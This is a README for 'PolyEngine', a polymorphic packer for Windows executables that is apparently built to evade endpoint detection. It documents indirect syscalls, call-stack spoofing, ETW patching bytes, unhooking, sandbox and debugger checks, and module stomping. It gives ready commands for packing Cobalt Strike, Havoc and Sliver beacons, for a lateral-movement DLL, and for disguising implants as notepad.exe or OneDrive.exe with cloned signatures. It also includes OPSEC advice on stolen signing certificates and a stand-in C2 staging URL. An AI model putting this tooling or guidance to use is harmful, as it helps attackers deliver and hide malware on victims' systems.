# PolyEngine — Polymorphic PE Packer 📦

**PolyEngine** is a research-grade, evasive PE packer designed for CTF challenges and low-level Windows security education. It focuses on bypassing EDR and AV heuristics through a layered stack of in-memory execution and obfuscation techniques.

This is a side project I've been working on for some time. I have used Claude Code to implement and correct some of techniques I wanted to implement in my own PE packer. There's a lot of comments on functions and what they do, since it was a big learning experience for me and Claude does this flawlessly (I'm bad at it). I hope it helps some people to learn some Windows internals or with bypassing some AVs and static detections from more advanced solutions when you tackle those ProLabs 🏯. 

🔥 Big thank you to [MalDevAcademy](https://maldevacademy.com/) for all the materials to create it and inspiration.

🌩 Thanks to [vx-underground](https://x.com/vxunderground) for inspiration via some goofy tweet with silly cat.

> **Disclaimer:** This tool is intended exclusively for authorized security testing, CTF competitions and educational use. Usage against systems without explicit permission is prohibited. The author assumes no liability for misuse.

---

## Usage

Build order: **Stub first, then Builder**. Stub Release|x64 emits `stub_v0.bin`..`stub_v3.bin`; Builder embeds one into `.rsrc`.

Ensure `stub_v0.bin`..`stub_v3.bin` are in the working directory (or pass `--stub`).

```
Builder.exe <input> <output> [OPTIONS]

  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)
            Payload type is auto-detected from the MZ header - no flag needed.
  <output>  Output executable

Loader:
  --stub <path>              Loader stub PE  [default: random ./stub_v0.bin..stub_v3.bin]
  --preset PRINT|MEDIA|NETWORK|RANDOM
                             Module stomping DLL preset  [default: PRINT]
  --overload                 Module overloading instead of stomping
                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)
  --keep-alive               ExitThread(0) instead of ExitProcess
                             (required for C2 implants that spawn their own threads)
  --unhook                   Restore original .text bytes in ntdll/kernel32/
                             kernelbase from \KnownDlls\ clean copies
                             (overwrites EDR inline hooks before any payload syscall)

Payload  (PE/DLL only, silently ignored for shellcode):
  --export <name>            DLL export to invoke after DllMain
  --arg <string>             Argument passed to the export  [max 127 chars]

Evasion  (all ON by default):
  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]
                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe
                                   SearchIndexer.exe taskhostw.exe spoolsv.exe
                                   wlrmdr.exe WMPDMC.exe hvix64.exe
  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]
                             (max 31 chars)
  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]
                             Detection threshold: 90% of <ms> elapsed
  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]
  --hammer-s <seconds>       API-hammer delay duration  [default: 3]
  --disable <token,token...>  Disable one or more features (comma-separated, repeatable)

  OPSEC tokens:
    etw         EtwEventWrite patch (ETW telemetry suppression)
    spoofing    Call-stack spoofing (SilentMoonwalk RSP pivot)
    peb         PEB path/cmdline spoof
    tls         TLS anti-debug callback (patches loader stub before embedding)

  Sandbox/debug check tokens:
    hammer      API-hammer timing delay (VirtualAlloc/Free loop)
    debugger    Debugger detection (PEB flags / NtQueryInformationProcess)
    api-emu     API emulation probe (RtlComputeCrc32 identity check)
    exec-ctrl   Execution-control semaphore (re-execution detection)
    sleep-fwd   Sleep-forwarding detection (timing)
    uptime      System uptime check
    cpu         CPU count check (< 2 logical cores)
    screen      Screen resolution check (<= 1024 px width)
    files       Recent-files count check (< 5 RecentDocs subkeys)
    all         Disable every token listed above

Identity spoofing:
  --pfx <path>               PFX certificate container to sign the output with
  --pfx-pass <password>      PFX passphrase  [omit if PFX has no password]
  --ts-url <url>             RFC 3161 timestamp URL  [default: no timestamping]
                             OPSEC: timestamping reveals build IP/time to the TSA.
                             Enable only when signing from an isolated VM, or when
                             the signature must survive cert revocation.
  --clone-meta <donor.exe>   Clone VERSIONINFO, icon, and Authenticode cert directory
                             from a donor PE (e.g. notepad.exe, OneDrive.exe).
                             Explorer "Details" tab shows donor company/product/version;
                             file icon matches donor; "Digital Signatures" tab shows
                             donor's signer (HashMismatch — defeats visual inspection only).
                             Name output to match donor OriginalFilename field.
                             When combined with --pfx: real signature overwrites cloned cert.
  --uac                      Embed a UAC elevation manifest (requireAdministrator).
                             Output PE prompts for admin privileges on launch.
                             Applied as Phase 10.5 (after packing, before signing).

Examples:
  Builder.exe implant.exe     packed.exe
  Builder.exe implant.exe     packed.exe --stub stub_v2.bin
  Builder.exe shellcode.bin   packed.exe --keep-alive
  Builder.exe beacon.dll      packed.exe --export Start --keep-alive
  Builder.exe payload.dll     packed.exe --export Execute --arg "calc.exe"
  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls
  Builder.exe implant.exe     packed.exe --overload --hammer-s 5 --uptime-min 5
  Builder.exe implant.exe     packed.exe --exec-ctrl-name MyMutex --sleep-fwd-ms 1000
  Builder.exe implant.exe     packed.exe --pfx cert.pfx --pfx-pass hunter2
  Builder.exe implant.exe     packed.exe --pfx cert.pfx --ts-url http://timestamp.digicert.com
  Builder.exe implant.exe     notepad.exe --clone-meta C:\Windows\System32\notepad.exe
  Builder.exe implant.exe     notepad.exe --clone-meta notepad.exe --pfx self.pfx
  Builder.exe implant.exe     packed.exe  --uac
  Builder.exe implant.exe     notepad.exe --uac --clone-meta notepad.exe --pfx self.pfx
```

---

## Examples

Worked examples grouped by scenario. Every flag is opt-out (evasion is fully ON by default), so the simplest invocation already gets the full stack.

<details>
<summary><b>Basic packing - EXE / DLL / shellcode</b></summary>

Pack an unmanaged EXE. Builder auto-detects the `MZ` header and routes through the RunPE path:
```
Builder.exe implant.exe packed.exe
```

Pack raw position-independent shellcode (Cobalt Strike `.bin`, msfvenom `-f raw`, etc.). No `MZ` → direct call into the decompressed buffer:
```
Builder.exe beacon.bin packed.exe
```

Pack a DLL and call its default `DllMain` only (no export):
```
Builder.exe payload.dll packed.exe
```

Use a stub from a non-default location:
```
Builder.exe implant.exe packed.exe --stub C:\build\release\stub_v1.bin
```

</details>

<details>
<summary><b>DLL payloads with exports - Havoc / Sliver / custom beacons</b></summary>

Call a named export after `DllMain` returns. Most C2 implants ship as a DLL with a single entry export (e.g. Havoc Demon: `Start`, Sliver: `RunSliver`):
```
Builder.exe demon.dll packed.exe --export Start --keep-alive
```

Pass a string argument to the export (max 127 chars). Useful for payloads that take a config string, URL, or shell command:
```
Builder.exe runner.dll packed.exe --export Execute --arg "https://c2.example.com/stage"
Builder.exe loader.dll packed.exe --export Run --arg "C:\\Windows\\System32\\calc.exe"
```

`--keep-alive` is required for any payload that spawns its own threads - without it the loader calls `ExitProcess` and kills the beacon.

</details>

<details>
<summary><b>Long-running implants (C2 beacons)</b></summary>

Cobalt Strike / Sliver / Havoc all spawn a beacon thread and return. The loader thread must terminate without taking the process down:
```
Builder.exe beacon.exe   packed.exe --keep-alive
Builder.exe beacon.bin   packed.exe --keep-alive
Builder.exe demon.dll    packed.exe --export Start --keep-alive
```

</details>

<details>
<summary><b>Module stomping presets - picking a host DLL</b></summary>

The decryptor stub is hidden inside the `.text` section of a benign Windows DLL. Pick the preset whose loaded modules look most legitimate for the target context:
```
Builder.exe implant.exe packed.exe --preset PRINT
Builder.exe implant.exe packed.exe --preset MEDIA
Builder.exe implant.exe packed.exe --preset NETWORK
Builder.exe implant.exe packed.exe --preset RANDOM
```

`PRINT` (default) - `xpsservices.dll`, `msi.dll`, `dbghelp.dll`. Common across most workstations.
`NETWORK` - `winhttp.dll`, `wtsapi32.dll`, `wlanapi.dll`. Fits a payload that already needs network APIs loaded.
`RANDOM` - three random indices from the full pool (including `bcrypt.dll`, idx 9).

Switch from `LoadLibraryW` stomping to `NtCreateSection`+`NtMapViewOfSection` overloading (DLL never enters `PEB.Ldr`):
```
Builder.exe implant.exe packed.exe --overload
Builder.exe implant.exe packed.exe --overload --preset NETWORK
```

</details>

<details>
<summary><b>EDR userland unhooking</b></summary>

Restore clean `.text` bytes for `ntdll`, `kernel32`, `kernelbase` from `\KnownDlls\` over any EDR inline hooks. HellsHall already bypasses sensitive `Nt*` hooks; `--unhook` is needed only when the payload itself calls hooked Win32 APIs (e.g. `LoadLibrary`, `CreateProcess`):
```
Builder.exe implant.exe packed.exe --unhook
Builder.exe implant.exe packed.exe --unhook --preset NETWORK --keep-alive
```

</details>

<details>
<summary><b>PEB spoofing - masquerading the process</b></summary>

Override the auto-picked spoof name. Pick something that fits the parent process / launch context (Office macro → `RuntimeBroker.exe` looks weird, `WmiPrvSE.exe` blends in better):
```
Builder.exe implant.exe packed.exe --spoof-name SgrmBroker.exe
Builder.exe implant.exe packed.exe --spoof-name svchost.exe
```

The spoof name is just an ASCII filename - Stub prepends `C:\Windows\System32\` at runtime. Anything not in the default 9-process pool works too.

</details>

<details>
<summary><b>Tuning evasion thresholds</b></summary>

Longer hammer delay against patient sandboxes that run for tens of seconds before judging:
```
Builder.exe implant.exe packed.exe --hammer-s 10
```

Higher uptime threshold - only run if the box has been up for at least 30 minutes (most sandboxes spin a fresh VM per sample):
```
Builder.exe implant.exe packed.exe --uptime-min 30
```

Tighter sleep-forwarding detection (shorter sleep, harder to fast-forward without observable error):
```
Builder.exe implant.exe packed.exe --sleep-fwd-ms 200
```

Custom semaphore name for the exec-control check (avoids clashing with another sample using the default `wuauctl`):
```
Builder.exe implant.exe packed.exe --exec-ctrl-name OneDriveSync
```

Stack everything for a paranoid profile:
```
Builder.exe implant.exe packed.exe --hammer-s 8 --uptime-min 15 --sleep-fwd-ms 250 --exec-ctrl-name TeamsUpdate
```

</details>

<details>
<summary><b>Disabling features for debugging / lab work</b></summary>

When iterating in a debugger, the TLS callback and debugger checks fire immediately. Disable both to attach freely:
```
Builder.exe implant.exe packed.exe --disable tls,debugger
```

Skip every sandbox check (still keeps OPSEC features on - ETW patch, PEB spoof, call-stack spoof):
```
Builder.exe implant.exe packed.exe --disable hammer,debugger,api-emu,exec-ctrl,sleep-fwd,uptime,cpu,screen,files
```

Same thing, shorter:
```
Builder.exe implant.exe packed.exe --disable all
```

Disable specific OPSEC features (e.g. when the target environment doesn't need ETW patching, or PEB spoof breaks a payload that walks its own PEB):
```
Builder.exe implant.exe packed.exe --disable etw
Builder.exe implant.exe packed.exe --disable peb,spoofing
```

`--disable all` only covers sandbox/debug checks. OPSEC tokens (`etw`, `spoofing`, `peb`, `tls`) must be listed explicitly.

</details>

<details>
<summary><b>Identity cloning — VERSIONINFO, icon, Authenticode cert</b></summary>

Copy the cosmetic identity of any donor PE into the packed output. The output binary's Explorer properties, taskbar icon, and Digital Signatures tab all reflect the donor:

```
Builder.exe implant.exe notepad.exe --clone-meta C:\Windows\System32\notepad.exe
Builder.exe implant.exe OneDrive.exe --clone-meta "C:\Program Files\Microsoft OneDrive\OneDrive.exe"
```

What gets cloned:
- **VERSIONINFO** (`RT_VERSION`) — Explorer "Properties → Details" tab: company, product name, file version, copyright. All language IDs present in the donor are copied.
- **Icon** (`RT_GROUP_ICON` + `RT_ICON`) — the lowest-ID icon group (the one Explorer uses for the shell icon). Taskbar, alt-tab, and file browser all show the donor's icon.
- **Authenticode cert directory** — the raw `WIN_CERTIFICATE` PKCS#7 blob is appended at 8-byte-aligned EOF. Explorer "Properties → Digital Signatures" shows the donor's signer (e.g. `Microsoft Windows`). `Get-AuthenticodeSignature` returns `Status = HashMismatch` — the signature is structurally valid but the hash covers the donor's bytes, not ours. Defeats casual visual inspection; any real verifier (`signtool verify`, `WinVerifyTrust`, AV engines) detects the mismatch.

**OPSEC — OriginalFilename:** the donor's VERSIONINFO embeds `OriginalFilename` (e.g. `notepad.exe`). Some signature checkers and Defender heuristics flag a mismatch between `OriginalFilename` and the actual file name on disk. Name the output to match:
```
Builder.exe implant.exe notepad.exe --clone-meta notepad.exe
```

**Combination with `--pfx`:** when both flags are present, Phase 11 (clone) runs before Phase 12 (sign). The real signature overwrites the cloned cert directory; VERSIONINFO and icon are preserved. `Get-AuthenticodeSignature` shows your certificate as valid, not the donor's hash-mismatched cert:
```
Builder.exe implant.exe notepad.exe --clone-meta notepad.exe --pfx self.pfx --pfx-pass hunter2
```

**Verification:**
```powershell
# Fake cert clone (no --pfx): expect HashMismatch, donor signer
Get-AuthenticodeSignature .\notepad.exe | Format-List *

# Real signature (--pfx): expect Valid, your cert
Get-AuthenticodeSignature .\notepad.exe | Format-List *

# signtool independent check
signtool verify /pa /v notepad.exe
```

</details>

<details>
<summary><b>UAC elevation — requireAdministrator manifest</b></summary>

Embed a `requestedExecutionLevel="requireAdministrator"` manifest so the output PE triggers a UAC prompt on launch and receives a high-integrity token if the user approves:

```
Builder.exe implant.exe packed.exe --uac
```

The manifest is an `RT_MANIFEST` resource (resource ID 1 — `CREATEPROCESS_MANIFEST_RESOURCE_ID`), the same slot the Windows loader checks for application compatibility and privilege manifests. The output is otherwise identical to a build without `--uac`; no changes to the Stub or payload path.

**Combination with `--clone-meta` and `--pfx`:** Phase 10.5 (manifest) runs before Phase 11 (clone) and Phase 12 (sign). The Authenticode signature computed in Phase 12 covers all embedded resources including the manifest — the hash is valid over the final binary. The UAC dialog shows the publisher name from the signing cert:

```
Builder.exe implant.exe notepad.exe --uac --clone-meta notepad.exe --pfx self.pfx --pfx-pass hunter2
```

**OPSEC:** a UAC prompt is a visible, user-facing event. The "Do you want to allow this app to make changes to your device?" dialog displays the on-disk filename and the Authenticode publisher (or "Unknown publisher" if unsigned). Combine `--uac` with `--clone-meta` to show a familiar icon and `--pfx` to show a credible publisher. For unattended execution that already starts from an elevated process (e.g. service, WMI lateral movement, local admin shell), `--uac` is unnecessary.

</details>

<details>
<summary><b>Authenticode signing (PFX, no signtool)</b></summary>

Sign the packed output with a PFX certificate. Builder talks to `mssign32!SignerSignEx2` directly — no `signtool.exe` on the operator workstation, no Windows SDK signing tool required:
```
Builder.exe implant.exe packed.exe --pfx cert.pfx --pfx-pass hunter2
```

PFX with no password (omit the `--pfx-pass` flag entirely):
```
Builder.exe implant.exe packed.exe --pfx cert.pfx
```

Add an RFC 3161 timestamp so the signature stays valid after the cert expires or is revoked. Note that the timestamp authority logs the build IP and the exact signing moment — see the OPSEC note below:
```
Builder.exe implant.exe packed.exe --pfx cert.pfx --pfx-pass hunter2 --ts-url http://timestamp.digicert.com
Builder.exe implant.exe packed.exe --pfx cert.pfx --ts-url http://timestamp.sectigo.com
Builder.exe implant.exe packed.exe --pfx cert.pfx --ts-url http://timestamp.globalsign.com/tsa/r6advanced1
```

**OPSEC — when to skip the timestamp:** `--ts-url` is opt-in. Each request to a public TSA puts the operator's build host into the TSA's HTTP logs alongside the exact second the signature was produced — a strong forensic correlation if the sample later surfaces in incident response. Embedding the timestamp also stamps that same moment into the signature blob inside the packed PE, where any later analyst can read it. When no timestamp is required (typical for self-signed certs or short-lived ops where signature validity beyond cert expiry doesn't matter), omit the flag and signing stays fully air-gappable.

**OPSEC — when to keep the timestamp:** stolen or short-lived code-signing certs that will be revoked benefit from a TSA countersignature — Windows accepts the signature post-revocation as long as the timestamp predates the revocation entry. In that case, sign from an isolated VM through a proxy / Tor, and treat the TSA's logs as a deliberate (but contained) exposure.

The private key is never persisted: `PFXImportCertStore` is called with `PKCS12_NO_PERSIST_KEY`, so no key container appears under `%APPDATA%\Microsoft\Crypto`. SHA-256 digest, CNG-preferred KSP for compatibility with PFXs produced by `New-SelfSignedCertificate` and OpenSSL ≥3.x.

</details>

<details>
<summary><b>Realistic combinations</b></summary>

Cobalt Strike beacon DLL, network-themed host, full evasion, custom mutex name:
```
Builder.exe beacon.dll packed.exe --export Start --keep-alive --preset NETWORK --exec-ctrl-name MicrosoftEdgeUpdate
```

Havoc Demon shellcode, overloading instead of stomping, longer hammer delay:
```
Builder.exe demon.bin packed.exe --keep-alive --overload --hammer-s 6
```

Stage-2 EXE for a CTF where you control the trigger and don't need anti-debug:
```
Builder.exe stage2.exe packed.exe --disable all --disable tls,debugger
```

Lateral-movement helper DLL with a path argument:
```
Builder.exe lateral.dll packed.exe --export Spread --arg "\\\\TARGET\\C$\\Users\\Public\\" --keep-alive --unhook
```

Long-term implant disguised as a common Microsoft binary, full evasion stack:
```
Builder.exe beacon.exe OneDrive.exe --clone-meta "C:\Program Files\Microsoft OneDrive\OneDrive.exe" --keep-alive --preset NETWORK --uptime-min 10
```

Packed sample with a real self-signed cert + matching VERSIONINFO identity:
```
Builder.exe implant.exe notepad.exe --clone-meta notepad.exe --pfx lab.pfx --pfx-pass test
```

</details>

---

## Build

**Visual Studio 2022 (MSVC v143), Release|x64 only.** Open `PolyEngine.sln`.

Build order matters:
1. **Stub** project (Release|x64) → MSBuild fan-out emits `x64/Release/stub_v0.bin` … `stub_v3.bin` (`POLY_VARIANT=0..3`)
2. **Builder** project → produces `Builder/x64/Release/Builder.exe` (or solution OutDir)

Each `stub_v*.bin` is a PE with linker entry `EntryPoint` only (no CRT). Variants differ in OPSEC phase order and decoy/island layout; HellsHall/Moonwalk stay shared. Builder picks one at random from the CWD (or via `--stub`), runs StubMorph, then embeds the payload under a per-build RT_RCDATA ID.

MASM: `Stub.vcxproj` → `HellsHall.asm`; Builder → `Engine/DecryptorStub.asm`. No CMake, no Makefile.

**To add a new API hash:** compute `Djb2HashA("ApiName")` (same algorithm as in `ApiHashing.cpp`), add a `g_Hash_*` global in `ApiHashing.h`, initialize it in `ApiHashing_InitHashes()`.

---

## Architecture Overview

Three components implementing a **pack → encrypt → inject** pipeline: **Builder** packs the input PE/shellcode, **Engine** (shared lib) provides crypto/compression/mutation primitives, **Stub** is the runtime executor embedded in the output PE.

<details>
<summary>Detailed pipeline + Stub execution flow</summary>

```
Builder.exe
  ├── picks loader stub (random stub_v0..v3.bin, or --stub <path>)
  ├── reads target PE or raw shellcode (.bin)
  ├── LZNT1 compress
  ├── CompoundEncrypt (inner cipher: XOR+ROL+ADD+XOR, per-build key)
  ├── MutationEngine → unique polymorphic ASM decryptor per build
  ├── CryptGenRandom → per-build XTEA key salt + DLL preset indices
  ├── XTEA-CTR encrypt (outer layer)
  ├── BuildInfectedPE:
  │     ├── patch TLS guard marker (--disable tls)
  │     ├── patch g_PayloadResIdMarker → per-build RT_RCDATA ID
  │     ├── StubMorph_Apply → timestamp, section names, island NOPs
  │     ├── write stub → output PE
  │     └── UpdateResource(RT_RCDATA, id) → [XTEA blob | 280-byte metadata]
  ├── (optional) UAC manifest / clone-meta / Authenticode sign
  └── Output.exe

Output.exe (= stub_v* variant + StubMorph + .rsrc payload)
  ├── Loader_InitApis          — ApiHashing_InitHashes + resolve kernel32 APIs
  ├── Loader_LoadPayload       — GetPayloadFromResource (280-byte metadata / opsecFlags)
  ├── Loader_Evasion           — HammerDelay + RunChecks (Win32 only, before syscalls)
  ├── Loader_InitSyscalls      — FreshyCalls SSN sort + InitNtApi (HellsHall bind)
  ├── Loader_OpsecPhase        — order depends on POLY_VARIANT (0..3):
  │     Unhook / StackSpoof_Init / PatchEtw / XTEA decrypt / SpoofPeb
  │     (HellsHall.asm + g_Spoof* layout identical in every variant)
  ├── Loader_DecryptExec       — ModuleStomp or ModuleOverload; decryptor RX call (RCX=payload);
  │                               LZNT1 decompress; restore stomped .text
  └── Loader_RunPayload        — StackSpoof_Cleanup then RunPE (PE) or RX+call (shellcode);
                                  keep-alive: ExitThread (PE) or Sleep park (raw SC)
```

</details>

---

## Evasion Techniques

<details>
<summary><b>Loader variants — <code>stub_v0.bin</code>..<code>stub_v3.bin</code></b></summary>

Stub Release|x64 builds **four** loaders via MSBuild (`POLY_VARIANT=0..3`, separate `IntDir`). Each binary has a different OPSEC phase order and per-variant decoy/island sizes (`PolyIslands.c`), so static hashes diverge. Shared and **never** variant-forked: `HellsHall.asm`, SilentMoonwalk data layout (`g_SpoofSyntheticStack`), TLS/ResID marker tags.

| Variant | `Loader_OpsecPhase` order |
|---|---|
| V0 | Unhook → Spoof → ETW → XTEA → PEB |
| V1 | Spoof → Unhook → XTEA → PEB → ETW |
| V2 | Unhook → Spoof → PEB → XTEA → ETW |
| V3 | Spoof → ETW → Unhook → XTEA → PEB |

Builder with no `--stub` picks randomly among `stub_v0.bin`..`stub_v3.bin` in the CWD (`CryptGenRandom`). `--stub <path>` forces one file.

</details>

<details>
<summary><b>Pack-time StubMorph</b></summary>

After TLS/ResID marker patches and before writing the output PE, `StubMorph_Apply` (`Engine/StubMorph.c`) mutates the chosen loader image in-place:

- random `TimeDateStamp`
- random 8-char names for non-critical sections (skips `.rsrc`, `.reloc`, `.tls`, `.CRT`)
- clear `IMAGE_DIRECTORY_ENTRY_DEBUG` + PE checksum (recomputed later if `--pfx`)
- rewrite POLY island pads (`50 4C 59 A0` … `AF` markers in `PolyIslands.c`) with multi-byte NOPs of the **same length** — no PE growth, no reloc fixups

Does not touch HellsHall, spoof globals, or marker tags used by TLS/ResID patching.

</details>

<details>
<summary><b>Indirect Syscalls — HellsHall</b></summary>

All sensitive NT operations (`NtProtectVirtualMemory`, `NtAllocateVirtualMemory`, etc.) go through indirect syscalls rather than the hooked user-mode stubs in the process ntdll:

1. At startup, `Syscalls_Init()` parses process ntdll's Export Directory and collects every `Zw*` function's RVA into a flat table.
2. SSNs are derived by **RVA-ordering** (HellsGate/FreshyCalls variant): all `Zw*` RVAs are sorted; sorted index == SSN. Hook-agnostic by design — works even if EDR hooks have rewritten function prologues, because hooks don't reorder exports.
3. A `syscall; ret` (`0F 05 C3`) trampoline is located inside process ntdll's `.text` section. The 3-byte sequence is the standard tail of every `Nt*` stub. EDR userland inline hooks target the *entry point* of exported `Nt*` functions (first 5–15 bytes) — never the syscall instruction at the stub's end, because patching the middle of a stub would break its semantics. The bytes at any matching site are therefore unmodified, identical to a clean `\KnownDlls\` mapping, and live in MEM_IMAGE memory backed by `C:\Windows\System32\ntdll.dll` on disk. `g_CleanTrampoline` points there directly — no secondary ntdll mapping, no MEM_PRIVATE copy.
4. All syscalls jump to `g_CleanTrampoline` — EDR hooks at exported Nt* entry points are bypassed. From an ETW kernel-side stack walker's perspective, the leaf frame already lands inside `ntdll.dll` (no "unbacked syscall" IOC).

</details>

<details>
<summary><b>Userland Unhooking — <code>--unhook</code></b></summary>

Optional pass that runs once after `Syscalls_Init()` and before any payload-relevant syscall. For each of `ntdll`, `kernel32`, `kernelbase`:

1. `NtOpenSection(\KnownDlls\<dll>)` + `NtMapViewOfSection` — clean image bytes (same shared section the loader originally mapped from, before any EDR could install hooks).
2. Page-by-page `memcmp` of the live `.text` against the clean copy.
3. Where bytes differ (= EDR inline hook): `NtProtect RX→RW`, `memcpy` clean bytes over the hook, `NtProtect RW→RX`.
4. Unmap and close.

This restores normal `ntdll.dll`/`kernel32.dll`/`kernelbase.dll` semantics for any subsequent Win32 call (PEB walks, `LoadLibrary`, etc.). Skipped when `--unhook` is omitted — HellsHall on its own already bypasses all sensitive `Nt*` hooks, so unhooking is opt-in (it's a heavier action with a small risk of breaking unusual hook layouts).

</details>

<details>
<summary><b>Call Stack Spoofing — SilentMoonwalk RSP Pivot</b></summary>

EDRs monitor the thread call stack at the moment a syscall fires to verify the caller chain looks legitimate. PolyEngine defeats this with a **SilentMoonwalk-style RSP pivot** — no hardware breakpoints, no VEH handler, no exceptions:

1. `StackSpoof_Init()` scans ntdll's `.text` (and any other `IMAGE_SCN_MEM_EXECUTE` section) for two gadgets:
   - **Gadget 1** — `add rsp, imm8; ret` (`48 83 C4 XX C3`) inside a function whose `UNWIND_INFO` advertises a matching `imm8` alloc delta. Constrained to `imm8 < 0x20` so the chain doesn't collide with forwarded stack args.
   - **Gadget 2** — `jmp rbx` (`FF E3`), located in any executable section by raw byte scan, but only accepted if the matching site sits inside a `RUNTIME_FUNCTION` whose `UNWIND_INFO` parses cleanly. The function's `allocDelta` determines where `RtlUserThreadStart` is planted on the synthetic stack, so a gadget without a matching runtime function would break the EDR-visible chain. Jumping into the middle of a longer instruction is fine — the CPU decodes `FF E3` from the gadget address regardless of the preceding byte.
2. A static `g_SpoofSyntheticStack[32]` is laid out so that the trampoline's `ret` walks gadget1 → gadget2 → back to the loader's continuation point, with `RtlUserThreadStart` planted further down as the apparent thread root.
3. Every call to `HellsHallSyscall` (when spoofing is enabled) does `push rbx; lea rbx, AfterJmpPoint; mov [g_SpoofSavedRsp], rsp; lea rsp, g_SpoofSyntheticStack; jmp r11`. The kernel sees an RSP pointing into the synthetic stack, anchored in legitimate ntdll code.
4. Stack-based syscall arguments (5..10) are forwarded from the caller's frame to the synthetic stack at offsets `0x28..0x50` *before* the pivot — without this, the kernel would read gadget addresses as arguments and return `STATUS_ACCESS_VIOLATION`.
5. After the syscall, gadget2's `jmp rbx` lands on `AfterJmpPoint`, which restores RSP from `g_SpoofSavedRsp`, pops `rbx`, and returns to the loader.
6. `StackSpoof_Cleanup()` clears `g_SpoofEnabled` so the payload's own threads see real return addresses.

</details>

<details>
<summary><b>Module Stomping / Module Overloading</b></summary>

Instead of `VirtualAlloc(RWX)`, the polymorphic decryptor executes inside the `.text` section of a legitimately loaded Windows DLL. No RWX memory is ever allocated.

**Stomping (default — `LoadLibraryW`, DLL appears in PEB LDR):**

1. `ModuleStomp_Alloc()` iterates the three DLLs selected by `--preset`. DLL indices are stored in `.rsrc` and resolved from `g_DllPool` at runtime.
2. The first DLL with an executable section large enough for the decryptor stub is chosen.
3. Original `.text` bytes are saved to a private `RW` buffer before touching the section.
4. The decryptor stub (only) is copied into the stomped region. The payload blob stays in a **separate** `RW` allocation (`pEncryptedPayload`).
5. `NtProtect RW → RX`: the stomped region becomes executable. The payload allocation remains `RW` — decryptor receives its address in `RCX` (Windows x64 ABI first argument).
6. Decryptor runs, decrypts `pEncryptedPayload` in-place. `NtProtect RX → RW` immediately after return.
7. Region is wiped, original bytes are restored, section is set back to `PAGE_EXECUTE_READ`.

**Overloading (`--overload` — `NtCreateSection(SEC_IMAGE)` + `NtMapViewOfSection`, NOT in PEB LDR):**

- Same save/restore pattern and no-RWX invariant as stomping.
- DLL is mapped directly from the raw file handle — never appears in `PEB.Ldr`, defeating tools that enumerate loaded modules.
- After use: `NtUnmapViewOfSection` discards COW private pages, removing all evidence of the write.

**Result in both cases:** memory region is `MEM_IMAGE` backed by the DLL's file on disk — memory scanners see a legitimate image mapping, not an anonymous `VirtualAlloc` region.

</details>

<details>
<summary><b>Polymorphic Decryptor — MutationEngine</b></summary>

Each build produces a unique 34-byte x64 ASM decryptor stub, never identical to any prior build:

- **NOP / junk insertion** — random NOP/junk instructions between functional instructions, drawn from a 22-entry pool spanning RBX/R10/R11/R12/R13 (PUSH/POP, XCHG, TEST, MOV self-copy)
- **Register swapping** — functional registers randomly reassigned across equivalent sets
- **Instruction substitution** — each cipher step emitted in one of three semantically equivalent variants (e.g. `xor al, k` / `sub al, ~k+1` / `not al; xor al, ~k`)
- **Loop counter variants** — `inc r9` randomized between `inc r9`, `add r9,1`, `lea r9,[r9+1]`; comparison swapped between `cmp rdx,r9` and `cmp r9,rdx`
- **Block permutation** — 4 independent setup blocks (RCX/RDX/R10/R11 zeroing) reordered via Fisher-Yates shuffle (24 possible orderings)
- **XOR key order swap** — random `xorSwapped` flag flips outer key application order; encryptor + decryptor stay in sync via metadata bit

The CompoundEncrypt cipher (XOR→ROL→ADD→XOR on each byte) maps cleanly to the four-instruction decryptor template. The MutationEngine emits a different variant combination for every step, making static signature matching of the decryptor loop infeasible.

</details>

<details>
<summary><b>Encryption Stack</b></summary>

| Layer | Algorithm | Key source |
|---|---|---|
| Outer | XTEA-CTR (128-bit) | Runtime-derived base XOR per-build `CryptGenRandom` salt |
| Inner | CompoundEncrypt (XOR+ROL+ADD+XOR) | Per-build `__rdtsc`-seeded compound key, embedded in decryptor stub |

**Outer XTEA key derivation** (`Xtea_DeriveKey`): the 128-bit key is built at runtime from arithmetic on irrational-number constants (φ, √2, √3, √5, √10 scaled to 32 bits). All five seed constants are themselves split into `volatile` XOR pairs (`A ^ B`) so no plaintext irrational byte sequence appears in `.rdata` — recovery requires running the derivation. No contiguous 16-byte key blob exists in the binary. The final key is `derived_base XOR key_salt`, where `key_salt` is 16 bytes of `CryptGenRandom` output stored in `.rsrc` — every build produces a unique keystream.

**Dynamic magic (no static YARA anchor):** the `.rsrc` metadata block ends with `magic = key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]`. The Stub locates the block by scanning backwards and verifying this invariant — no `0xDEADBEEF` or other fixed constant exists for a YARA rule to anchor on.

</details>

<details>
<summary><b>TLS Callback Anti-Debug</b></summary>

The Windows Loader invokes TLS callbacks from `.CRT$XLB` **before `AddressOfEntryPoint`** receives control — before any payload is in memory. At that moment the environment is probed with zero external API dependencies (only CPU intrinsics and direct PEB reads):

| Check | PEB / Heap field | Detection condition |
|---|---|---|
| BeingDebugged | `PEB+0x002` | any Win32 debugger attached |
| NtGlobalFlag | `PEB+0xBC` (x64) | bits `0x70` set by ntdll under a debugger |
| Heap Flags | `ProcessHeap+0x70` (x64) | value != 2 (HEAP_GROWABLE) |
| Heap ForceFlags | `ProcessHeap+0x74` (x64) | value != 0 |

On detection: `__fastfail(FAST_FAIL_FATAL_APP_EXIT)` — bypasses all user-mode exception handlers (VEH, SEH, UnhandledExceptionFilter). WER records `STATUS_STACK_BUFFER_OVERRUN (c0000409)`, indistinguishable from a legitimate memory-safety crash.

Can be disabled at build time with `--disable tls`. Builder patches a 5-byte marker in the loader stub to neutralize the callback before embedding.

</details>

<details>
<summary><b>ETW Patching</b></summary>

`Opsec_PatchEtw()` writes a 3-byte no-op to the first bytes of `EtwEventWrite` in the process ntdll:

```asm
; After patch:
33 C0    xor eax, eax   ; return STATUS_SUCCESS (0)
C3       ret
```

Applied through `NtProtectVirtualMemory` (via HellsHall + Moonwalk RSP pivot). A separate `pPage` variable holds the base address for `NtProtect` (the kernel may round it to a page boundary); `pEtw` is preserved for the actual byte write.

</details>

<details>
<summary><b>PEB Spoofing</b></summary>

`Opsec_SpoofPeb()` rewrites:
